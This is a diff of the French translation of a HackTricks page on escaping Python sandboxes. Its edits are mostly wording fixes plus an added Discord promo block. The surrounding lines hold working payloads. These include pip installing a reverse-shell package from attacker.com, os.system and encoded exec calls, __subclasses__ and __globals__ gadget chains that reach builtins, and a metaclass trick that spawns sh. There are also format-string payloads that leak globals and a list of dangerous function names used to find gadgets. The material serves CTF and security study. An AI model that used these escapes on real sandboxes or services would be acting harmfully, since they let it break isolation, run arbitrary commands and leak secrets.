@@ -14,11 +14,19 @@ Autres façons de soutenir HackTricks :
 
 </details>
 
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 Voici quelques astuces pour contourner les protections des sandbox Python et exécuter des commandes arbitraires.
 
 ## Bibliothèques d'exécution de commandes
 
-La première chose à savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pouvez importer l'une de ces bibliothèques :
+La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pouvez importer l'une de ces bibliothèques :
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -91,7 +99,7 @@ Si vous avez accès à `pip` ou `pip.main()`, vous pouvez installer un package a
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Vous pouvez télécharger le package pour créer le shell inversé ici. Veuillez noter qu'avant de l'utiliser, vous devez **le décompresser, modifier le `setup.py`, et mettre votre adresse IP pour le shell inversé**:
+Vous pouvez télécharger le package pour créer le shell inversé ici. Veuillez noter qu'avant de l'utiliser, vous devez **le décompresser, modifier le `setup.py`, et mettre votre IP pour le shell inversé**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
@@ -105,7 +113,7 @@ Ce package s'appelle `Reverse`. Cependant, il a été spécialement conçu de so
 Notez que exec autorise les chaînes multilignes et le point-virgule, mais eval ne le fait pas (vérifiez l'opérateur walrus)
 {% endhint %}
 
-Si certains caractères sont interdits, vous pouvez utiliser la représentation **hexadécimale/octale/B64** pour **contourner** la restriction:
+Si certains caractères sont interdits, vous pouvez utiliser la représentation **hexadécimale/octale/Base64** pour **contourner** la restriction:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -151,7 +159,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Contourner les protections à travers les encodages (UTF-7)
 
-Dans [**cette analyse**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) l'UTF-7 est utilisé pour charger et exécuter du code Python arbitraire à l'intérieur d'un sandbox apparent:
+Dans [**ce compte rendu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un sandbox apparent:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -248,7 +256,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Création d'objets avec [méta-classes](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-La chose clé que les méta-classes nous permettent de faire est de **créer une instance d'une classe, sans appeler directement le constructeur**, en créant une nouvelle classe avec la classe cible en tant que méta-classe.
+La chose clé que les méta-classes nous permettent de faire est de **créer une instance d'une classe, sans appeler directement le constructeur**, en créant une nouvelle classe avec la classe cible comme méta-classe.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -307,7 +315,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Lire le fichier avec l'aide des builtins et la licence
+### Lire le fichier avec l'aide des fonctions intégrées et la licence
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -375,7 +383,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Ci-dessous se trouve une fonction plus grande**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **emplacements** où vous pouvez trouver les **builtins**.
+[**Ci-dessous, il y a une fonction plus grande**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **emplacements** où vous pouvez trouver les **builtins**.
 
 #### Python2 et Python3
 ```python
@@ -391,9 +399,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Globals and locals
+## Globaux et locaux
 
-Vérifier les **`globals`** et les **`locals`** est un bon moyen de savoir à quoi vous pouvez accéder.
+Vérifier les **`globals`** et **`locals`** est un bon moyen de savoir à quoi vous pouvez accéder.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -516,7 +524,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-De plus, si vous pensez que **d'autres bibliothèques** peuvent être en mesure de **appeler des fonctions pour exécuter des commandes**, nous pouvons également **filtrer par noms de fonctions** à l'intérieur des bibliothèques potentielles:
+De plus, si vous pensez que **d'autres bibliothèques** peuvent être en mesure de **appeler des fonctions pour exécuter des commandes**, nous pouvons également **filtrer par noms de fonctions** à l'intérieur des bibliothèques possibles:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -551,7 +559,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche récursive des fonctions intégrées, des variables globales...
 
 {% hint style="warning" %}
-C'est tout simplement **génial**. Si vous **cherchez un objet tel que globals, builtins, open ou tout autre chose**, utilisez ce script pour **rechercher de manière récursive les endroits où vous pouvez trouver cet objet.**
+C'est tout simplement **génial**. Si vous **cherchez un objet tel que globals, builtins, open ou tout autre chose**, utilisez ce script pour **rechercher de manière récursive les endroits où vous pouvez trouver cet objet**.
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -676,7 +684,7 @@ Vous pouvez vérifier la sortie de ce script sur cette page :
 
 ## Chaîne de format Python
 
-Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder aux **informations internes de python**. Vous pouvez utiliser les exemples précédents pour accéder aux globaux ou aux fonctions intégrées par exemple.
+Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder à **des informations internes de python**. Vous pouvez utiliser les exemples précédents pour accéder aux globaux ou aux fonctions intégrées par exemple.
 
 {% hint style="info" %}
 Cependant, il y a une **limitation**, vous ne pouvez utiliser que les symboles `.[]`, donc vous **ne pourrez pas exécuter de code arbitraire**, juste lire des informations.\
@@ -701,7 +709,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et aux éléments du **dictionnaire** avec des **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et un **élément de dictionnaire** avec des **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -724,14 +732,14 @@ return 'HAL 9000'
 **Plus d'exemples** sur les exemples de **format** **string** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Consultez également la page suivante pour des gadgets qui vont **lire des informations sensibles à partir d'objets internes Python**:
+Consultez également la page suivante pour des gadgets qui vont **lire des informations sensibles à partir des objets internes de Python**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Charges de divulgation d'informations sensibles
+### Charges utiles de divulgation d'informations sensibles
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -745,10 +753,10 @@ Consultez également la page suivante pour des gadgets qui vont **lire des infor
 ## Disséquer les objets Python
 
 {% hint style="info" %}
-Si vous voulez **apprendre** en profondeur sur le **bytecode Python**, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Si vous voulez en savoir plus sur le **bytecode Python**, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où se trouve le drapeau** et vous devez examiner les **internes** de la **fonction** pour l'extraire.
+Dans certains CTF, il se peut que vous soyez fourni avec le nom d'une **fonction personnalisée où se trouve le drapeau** et vous devez examiner les **internes** de la **fonction** pour l'extraire.
 
 Voici la fonction à inspecter :
 ```python
@@ -770,7 +778,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` et `func_globals`(Même) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, certaines variables globales et leur contenu déclaré:
+`__globals__` et `func_globals` (identiques) permettent d'obtenir l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, certaines variables globales et leur contenu déclaré:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -895,7 +903,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilation de Python
 
-Maintenant, imaginons que vous puissiez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **l'exécuter**.\
+Maintenant, imaginons que vous puissiez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** l'**exécuter**.\
 Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le drapeau** (_imaginez une fonction `calc_flag` plus complexe_).
 ```python
 def get_flag(some_input):
@@ -956,7 +964,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Contourner les défenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code Python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout en **une seule ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout en **une seule ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la machine **CTF** (par exemple parce que nous n'avons pas la fonction `compile` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
@@ -1029,7 +1037,11 @@ seront contournés
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-***
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
